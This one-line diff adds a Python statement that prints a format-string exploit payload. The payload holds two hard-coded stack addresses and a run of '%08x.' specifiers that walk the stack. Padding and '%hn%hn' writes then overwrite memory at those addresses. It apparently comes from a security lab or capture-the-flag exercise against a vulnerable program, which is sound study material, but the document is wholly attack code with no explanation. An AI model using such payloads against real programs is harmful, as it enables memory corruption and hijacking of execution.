@@ -1,0 +1,1 @@
+print('\x8C\xE5\xFF\xBF\x8E\xE5\xFF\xBF'+ '%08x.'* 317 + 'A'*99 + '%hn%hn'+ '%08x.'*50)
